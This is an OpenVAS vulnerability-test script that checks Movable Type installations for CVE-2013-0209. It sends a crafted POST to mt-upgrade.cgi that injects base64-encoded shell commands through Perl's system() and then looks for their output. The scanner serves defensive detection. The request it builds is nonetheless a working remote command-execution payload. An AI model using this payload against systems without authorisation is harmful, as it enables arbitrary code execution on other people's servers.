###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_movable_type_57490.nasl 11 2013-10-27 10:12:02Z jan $
#
# Movable Type Multiple SQL Injection and Command Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Movable Type is prone to multiple SQL-injection and command-injection
vulnerabilities because the application fails to properly sanitize user-
supplied input.

Exploiting these issues could allow an attacker to execute arbitrary
code, compromise the application, access or modify data, or exploit
latent vulnerabilities in the underlying database.

Versions prior to Movable Type 4.38 are vulnerable.";


tag_solution = "Updates are available. Please see the references for more details.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103651";
CPE = "cpe:/a:sixapart:movable_type";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(57490);
 script_cve_id("CVE-2013-0209");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_version ("$Revision: 11 $");

 script_name("Movable Type Multiple SQL Injection and Command Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/57490");
 script_xref(name : "URL" , value : "http://www.sixapart.com/movabletype/");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-01-31 13:27:06 +0100 (Thu, 31 Jan 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("mt_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("movabletype/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

host = get_host_name();
cmds = exploit_commands();

foreach cmd (keys(cmds)) {

  _cmd = base64(str:cmds[cmd]);
  _cmd = urlencode(str:_cmd);
  
  ex = '%5f%5fmode=run%5factions&installing=1&steps=%5b%5b%22core%5fdrop%5fmeta%5ffor%5ftable%22%2c%22class%22%2c%22v0%3buse%20' + 
       'MIME%3a%3aBase64%3bsystem%28decode%5fbase64%28q%28' + _cmd  + '%29%29%29%3breturn%200%22%5d%5d';

  len = strlen(ex);

  req = string("POST ", dir, "/mt-upgrade.cgi HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ",len,"\r\n",
               "\r\n",
               ex);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(eregmatch(pattern:cmd, string:result)) {
    security_hole(port:port);
    exit(0);
  }  

}  







